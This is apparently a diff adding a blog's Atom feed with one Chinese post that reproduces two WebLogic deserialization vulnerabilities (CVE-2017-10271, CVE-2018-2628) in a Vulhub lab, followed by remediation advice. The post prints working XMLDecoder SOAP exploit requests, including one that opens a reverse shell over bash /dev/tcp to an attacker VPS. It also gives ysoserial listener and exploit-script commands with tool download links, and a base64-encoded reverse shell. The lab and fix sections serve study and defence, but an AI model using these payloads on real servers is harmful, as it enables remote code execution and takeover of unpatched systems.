@@ -1,0 +1,502 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>http://example.com</id>
+    <title>江霁月的私人小屋 • Posts by &#34;weblogic&#34; category</title>
+    <link href="http://example.com" />
+    <updated>2022-10-18T14:24:49.000Z</updated>
+    <category term="Docker" />
+    <category term="linux" />
+    <category term="mysql" />
+    <category term="优化" />
+    <category term="服务器" />
+    <category term="缓存" />
+    <category term="Centos" />
+    <category term="ELK" />
+    <category term="安全管理" />
+    <category term="数据可视化" />
+    <category term="监控" />
+    <category term="运维" />
+    <category term="Zabbix" />
+    <category term="Kali" />
+    <category term="信息安全" />
+    <category term="数据库" />
+    <category term="nginx" />
+    <category term="PHP" />
+    <category term="openresty" />
+    <category term="网关" />
+    <category term="python" />
+    <category term="爬虫" />
+    <category term="Security" />
+    <category term="信息收集" />
+    <category term="SSL" />
+    <category term="安全加固" />
+    <category term="Linux" />
+    <category term="waf" />
+    <entry>
+        <id>http://example.com/category/bea9834dd80e.html</id>
+        <title>weblogic漏洞复现</title>
+        <link rel="alternate" href="http://example.com/category/bea9834dd80e.html"/>
+        <content type="html">&lt;h2 id=&#34;wls-wsat-xmldecoder-反序列化漏洞cve-2017-10271&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wls-wsat-xmldecoder-反序列化漏洞cve-2017-10271&#34;&gt;#&lt;/a&gt; ‘wls-wsat’ XMLDecoder 反序列化漏洞 (CVE-2017-10271)&lt;/h2&gt;
+&lt;h3 id=&#34;漏洞概述&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞概述&#34;&gt;#&lt;/a&gt; 漏洞概述&lt;/h3&gt;
+&lt;p&gt;WebLogic 反序列化漏洞 CVE-2017-3248 和 WebLogic WLS LS 组件的远程代码执行漏洞 CVE-2017-10271，Oracle 官方在 2017 年 10 月份发布了该漏洞的补丁，但没有公开漏洞细节，如果企业未及时安装补丁，存在被攻击的风险。对企业服务器发起了大范围远程攻击，对大量企业的服务器造成了严重威胁，&lt;strong&gt;受影响的版本:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;10.3.6.0.0&lt;/li&gt;
+&lt;li&gt;12.1.3.0.0&lt;/li&gt;
+&lt;li&gt;12.2.1.1.0&lt;/li&gt;
+&lt;li&gt;12.2.1.2.0**&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;漏洞复现&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞复现&#34;&gt;#&lt;/a&gt; 漏洞复现&lt;/h3&gt;
+&lt;h4 id=&#34;攻击说明&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#攻击说明&#34;&gt;#&lt;/a&gt; 攻击说明&lt;/h4&gt;
+&lt;p&gt;攻击者选定要攻击的目标主机后，将首先利用漏洞 CVE-2017-3248 进行攻击，无论是否成功，都将再利用 CVE-2017-10271 进行攻击。在每一次的攻击过程中，都是先针对 Windows 系统，再针对 Linux 系统。具体攻击流程如下：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;利用 WebLogic 反序列化漏洞（CVE-2017-3248）调用 Linux 中的 wget 下载 shell 脚本并调用 Linux 本地 “/bin/bash” 执行 shell 脚本。（shell 脚本内容内定义了从远端下载执行 watch-smartd 挖矿程序控制细节）&lt;/li&gt;
+&lt;li&gt;利用 WebLogic 反序列化漏洞（CVE-2017-3248）调用 Windows 中的 PowerShell 进行样本下载和运行。&lt;/li&gt;
+&lt;li&gt;利用 WebLogic WLS 组件漏洞（CVE-2017-10271）调用 Linux 中的 wget 下载 shell 脚本并调用 Linux 本地 “/bin/bash” 执行 shell 脚本。&lt;/li&gt;
+&lt;li&gt;利用 WebLogic WLS 组件漏洞（CVE-2017-10271）调用 Windows 中的 powershell 进行样本下载和恶意代码执行。&lt;/li&gt;
+&lt;li&gt;在此次的攻击事件中，CVE-2017-3248 利用不成功，CVE-2017-10271 则利用成功，从而导致了服务器被攻击者攻陷，进而在系统日志中留下了痕迹。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;靶场搭建&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#靶场搭建&#34;&gt;#&lt;/a&gt; 靶场搭建&lt;/h4&gt;
+&lt;ol&gt;
+&lt;li&gt;直接在 Centos 虚拟机基于 Vulhub 漏洞集成环境生成靶场.&lt;/li&gt;
+&lt;li&gt;进入 Vulhub 对应的漏洞路径下执行命令 &lt;code&gt;docker-compose up -d&lt;/code&gt;  编译并运行靶场容器&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;docker ps&lt;/code&gt;  查看端口&lt;strong&gt;下方修改了默认端口&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;访问 &lt;code&gt;http://192.168.2.188:7002/wls-wsat/CoordinatorPortType11&lt;/code&gt; , 如果存在下图则说明或许存在漏洞	&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171519659.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=WSBEt&amp;amp;originHeight=332&amp;amp;originWidth=1916&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;漏洞探测&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞探测&#34;&gt;#&lt;/a&gt; 漏洞探测&lt;/h4&gt;
+&lt;p&gt;我们向服务器上传一个文件，如果上传并访问成功，证明存在此漏洞，将下方 IP 换掉&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;POST /wls-wsat/CoordinatorPortType HTTP/1.1
+Host: YOUR-IP:7001
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8    */#
+Upgrade-Insecure-Requests: 1
+Content-Type: text/xml
+Content-Length: 675
+
+
+&amp;lt;soapenv:Envelope xmlns:soapenv=&amp;quot;http://schemas.xmlsoap.org/soap/envelope/&amp;quot;&amp;gt;
+      &amp;lt;soapenv:Header&amp;gt;
+        &amp;lt;work:WorkContext xmlns:work=&amp;quot;http://bea.com/2004/06/soap/workarea/&amp;quot;&amp;gt;
+         &amp;lt;java version=&amp;quot;1.6.0&amp;quot; class=&amp;quot;java.beans.XMLDecoder&amp;quot;&amp;gt;
+                    &amp;lt;object class=&amp;quot;java.io.PrintWriter&amp;quot;&amp;gt; 
+                        &amp;lt;string&amp;gt;servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/test.txt&amp;lt;/string&amp;gt;&amp;lt;void method=&amp;quot;println&amp;quot;&amp;gt;
+                        &amp;lt;string&amp;gt;xmldecoder_vul_test&amp;lt;/string&amp;gt;&amp;lt;/void&amp;gt;&amp;lt;void method=&amp;quot;close&amp;quot;/&amp;gt;
+                    &amp;lt;/object&amp;gt;
+            &amp;lt;/java&amp;gt;
+        &amp;lt;/work:WorkContext&amp;gt;
+      &amp;lt;/soapenv:Header&amp;gt;
+      &amp;lt;soapenv:Body/&amp;gt;
+&amp;lt;/soapenv:Envelope&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171555661.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=YEspK&amp;amp;originHeight=1054&amp;amp;originWidth=1582&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171555437.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=zH3M7&amp;amp;originHeight=133&amp;amp;originWidth=621&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反弹shell&#34;&gt;#&lt;/a&gt; 反弹 Shell&lt;/h4&gt;
+&lt;p&gt;步骤和上方一样，将 payload 换为写 shell 的&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;soapenv:Envelope xmlns:soapenv=&amp;quot;http://schemas.xmlsoap.org/soap/envelope/&amp;quot;&amp;gt;
+    &amp;lt;soapenv:Header&amp;gt;
+        &amp;lt;work:WorkContext xmlns:work=&amp;quot;http://bea.com/2004/06/soap/workarea/&amp;quot;&amp;gt;
+            &amp;lt;java version=&amp;quot;1.4.0&amp;quot; class=&amp;quot;java.beans.XMLDecoder&amp;quot;&amp;gt;
+                &amp;lt;void class=&amp;quot;java.lang.ProcessBuilder&amp;quot;&amp;gt;
+                    &amp;lt;array class=&amp;quot;java.lang.String&amp;quot; length=&amp;quot;3&amp;quot;&amp;gt;
+                        &amp;lt;void index=&amp;quot;0&amp;quot;&amp;gt;
+                            &amp;lt;string&amp;gt;/bin/bash&amp;lt;/string&amp;gt;
+                        &amp;lt;/void&amp;gt;
+                        &amp;lt;void index=&amp;quot;1&amp;quot;&amp;gt;
+                            &amp;lt;string&amp;gt;-c&amp;lt;/string&amp;gt;
+                        &amp;lt;/void&amp;gt;
+                        &amp;lt;void index=&amp;quot;2&amp;quot;&amp;gt;
+                            &amp;lt;string&amp;gt;bash -i &amp;amp;gt;&amp;amp;amp; /dev/tcp/YOUR-VPS-IP/6666 0&amp;amp;gt;&amp;amp;amp;1&amp;lt;/string&amp;gt;
+                        &amp;lt;/void&amp;gt; 
+                    &amp;lt;/array&amp;gt;
+                    &amp;lt;void method=&amp;quot;start&amp;quot;/&amp;gt;
+                &amp;lt;/void&amp;gt;
+            &amp;lt;/java&amp;gt;
+        &amp;lt;/work:WorkContext&amp;gt;
+    &amp;lt;/soapenv:Header&amp;gt;
+    &amp;lt;soapenv:Body/&amp;gt;
+&amp;lt;/soapenv:Envelope&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171558519.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=e3GrW&amp;amp;originHeight=995&amp;amp;originWidth=1920&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171605805.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=O2Mno&amp;amp;originHeight=173&amp;amp;originWidth=857&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;修复建议&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#修复建议&#34;&gt;#&lt;/a&gt; 修复建议&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;临时解决方案&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 根据攻击者利用 POC 分析发现所利用的为 wls-wsat 组件的 CoordinatorPortType 接口，若 Weblogic 服务器集群中未应用此组件，建议临时备份后将此组件删除，当形成防护能力后，再进行恢复&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 根据实际环境路径，删除 WebLogic wls-wsat 组件：&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;rm&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-f&lt;/span&gt; /home/WebLogic/Oracle/Middleware/wlserver_10.3/server/lib/wls-wsat.war&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;rm&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-f&lt;/span&gt; /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.war&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;rm&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-rf&lt;/span&gt; /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 重启 Weblogic 域控制器服务&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 停止服务&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;DOMAIN_NAME/bin/stopWeblogic.sh&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 启动服务&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;DOMAIN_NAME/bin/startManagedWebLogic.sh&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 删除以上文件之后，需重启 WebLogic&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;确认http://weblogic_ip/wls-wsat/ 是否为404页面。&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;官方补丁修复&lt;br&gt;
+前往 Oracle 官网下载 10 月份所提供的安全补丁 http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;wls-core-components-反序列化命令执行漏洞cve-2018-2628&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wls-core-components-反序列化命令执行漏洞cve-2018-2628&#34;&gt;#&lt;/a&gt; WLS Core Components 反序列化命令执行漏洞 (CVE-2018-2628)&lt;/h2&gt;
+&lt;h3 id=&#34;漏洞概述-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞概述-2&#34;&gt;#&lt;/a&gt; 漏洞概述&lt;/h3&gt;
+&lt;p&gt;Weblogic Server 中的 RMI 通信使用 T3 协议在 Weblogic Server 和其它 Java 程序（客户端或者其它 Weblogic Server 实例）之间传输数据，服务器实例会跟踪连接到应用程序的每个 Java 虚拟机（JVM）中，并创建 T3 协议通信连接，将流量传输到 Java 虚拟机. T3 协议在开放 WebLogic 控制台端口的应用上默认开启。攻击者可以通过 T3 协议发送恶意的的反序列化数据，进行反序列化，实现对存在漏洞的 weblogic 组件的远程代码执行攻击。&lt;/p&gt;
+&lt;h3 id=&#34;影响版本&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#影响版本&#34;&gt;#&lt;/a&gt; 影响版本：&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Oracle Weblogic Server10.3.6.0.0&lt;/li&gt;
+&lt;li&gt;Oracle Weblogic Server12.1.3.0.0&lt;/li&gt;
+&lt;li&gt;Oracle Weblogic Server12.2.1.2.0&lt;/li&gt;
+&lt;li&gt;Oracle Weblogic Server12.2.1.3.0&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;漏洞复现-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞复现-2&#34;&gt;#&lt;/a&gt; 漏洞复现&lt;/h3&gt;
+&lt;h4 id=&#34;漏洞探测-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞探测-2&#34;&gt;#&lt;/a&gt; 漏洞探测&lt;/h4&gt;
+&lt;ol&gt;
+&lt;li&gt;使用 namp 查看目标主机是否启用 T3 协议&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;nmap &lt;span class=&#34;token parameter variable&#34;&gt;-p&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;7001&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-T4&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-A&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-v&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;--script&lt;/span&gt; weblogic-t3-info &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.2.188&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171851880.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=DABru&amp;amp;originHeight=402&amp;amp;originWidth=1069&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;启动 JRMP Server (监听 1099)&lt;br&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zZWN1cml0eS0xMjU4ODk0NzI4LmNvcy5hcC1iZWlqaW5nLm15cWNsb3VkLmNvbS93cml0ZXVwL3Z1bGh1Yi93ZWJsb2dpYy95c29zZXJpYWwtMC4wLjYtU05BUFNIT1QtYWxsLmphcg==&#34;&gt;https://security-1258894728.cos.ap-beijing.myqcloud.com/writeup/vulhub/weblogic/ysoserial-0.0.6-SNAPSHOT-all.jar&lt;/span&gt;&lt;br&gt;
+ &lt;code&gt;java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 &#39;ping 0qie8z.dnslog.cn&#39;&lt;/code&gt; 	&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171807650.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=n8I5W&amp;amp;originHeight=138&amp;amp;originWidth=1351&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
+&lt;li&gt;执行脚本&lt;br&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zZWN1cml0eS0xMjU4ODk0NzI4LmNvcy5hcC1iZWlqaW5nLm15cWNsb3VkLmNvbS93cml0ZXVwL3Z1bGh1Yi93ZWJsb2dpYy9DVkUtMjAxOC0yNjI4LnB5&#34;&gt; https://security-1258894728.cos.ap-beijing.myqcloud.com/writeup/vulhub/weblogic/CVE-2018-2628.py&lt;/span&gt;&lt;br&gt;
+ &lt;code&gt;python2 CVE-2018-2628.py 192.168.2.188 7001 ysoserial-0.0.6-SNAPSHOT-all.jar 192.168.2.107 1099 JRMPClient&lt;/code&gt; &lt;br&gt;
+192.168.2.188: 目标 IP&lt;br&gt;
+192.168.2.107: 刚刚开启监听 1099 端口的主机 IP	&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171848106.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=nc9dS&amp;amp;originHeight=316&amp;amp;originWidth=1335&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+查看监听状态&lt;br&gt;
+&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171849466.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=yMzAU&amp;amp;originHeight=148&amp;amp;originWidth=497&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
+&lt;li&gt;验证漏洞是否成功	&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171848836.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=swh6M&amp;amp;originHeight=1031&amp;amp;originWidth=1920&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;反弹shell-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反弹shell-2&#34;&gt;#&lt;/a&gt; 反弹 Shell&lt;/h4&gt;
+&lt;p&gt;步骤和上面一样，只需将 ping 更换为 base64 后的 payload&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;bash&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-i&lt;/span&gt;  &lt;span class=&#34;token operator&#34;&gt;&gt;&amp;amp;&lt;/span&gt;  /dev/tcp/192.168.43.220/1234 &lt;span class=&#34;token operator&#34;&gt;&lt;span class=&#34;token file-descriptor important&#34;&gt;0&lt;/span&gt;&gt;&lt;/span&gt;&lt;span class=&#34;token file-descriptor important&#34;&gt;&amp;amp;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 进行 base64 编码&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 一会儿要用到 base64 编码后的 shell，命令如下：&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;bash&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-c&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;echo,YmFzaCAtaSAgPiYgIC9kZXYvdGNwLzE5Mi4xNjguNDMuMjIwLzEyMzQgMD4mMQ&lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;base64,-d&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;bash,-I&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 可以使用下面地址进行 base64:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# https://ares-x.com/tools/runtime-exec/&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171855879.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=tomIu&amp;amp;originHeight=1040&amp;amp;originWidth=1909&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171906916.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=fZEPC&amp;amp;originHeight=217&amp;amp;originWidth=743&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;修复建议-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#修复建议-2&#34;&gt;#&lt;/a&gt; 修复建议&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;此漏洞产生于 Weblogic T3 服务，当开放 Weblogic 控制台端口（默认为 7001 端口）时，T3 服务会默认开启。关闭 T3 服务，或控制 T3 服务的访问权限，能防护该漏洞。对于不在 Oracle 官方支持范围内的版本，由于没有最新补丁，推荐采用此种方式进行修复。同时，Weblogic 采用黑名单的方式进行反序列化漏洞的修复，存在被绕过的风险，因此控制 T3 服务为防护 Weblogic RMI 这类反序列化漏洞的有效方式。控制 T3 服务方式：&lt;/li&gt;
+&lt;li&gt;进入 Weblogic 控制台，在 base_domain 的配置页面中，进入 “安全” 选项卡页面，点击 “筛选器”，进入连接筛选器配置。&lt;/li&gt;
+&lt;li&gt;在连接筛选器中输入：weblogic.security.net.ConnectionFilterImpl，在连接筛选器规则中输入： &lt;code&gt;127.0.0.1 allow t3 t3s，0.0.0.0/0 deny t3 t3s&lt;/code&gt;  (t3 和 t3s 协议的所有端口只允许本地访问)。&lt;/li&gt;
+&lt;li&gt;保存后需重新启动，规则方可生效。&lt;/li&gt;
+&lt;li&gt;更新 Oracle 官方发布的最新补丁，同时升级 jdk 至 1.7.0.21 以上版本。&lt;/li&gt;
+&lt;li&gt;如以上两种策略都无法采用，则可以考虑用更改代码的方式。以 10.3.6.0 为例，在 &lt;code&gt;weblogic.utils.io.oif.WebLogicFilterConfig&lt;/code&gt;  的黑名单 &lt;code&gt;DEFAULT_BLACKLIST_CLASS&lt;/code&gt;  中添加 &lt;code&gt;java.rmi.server.RemoteObjectInvocationHandler&lt;/code&gt; , 编译并更新 swlclient.jar、wlthint3client.jar 这两个用到该类的包&lt;/li&gt;
+&lt;/ol&gt;
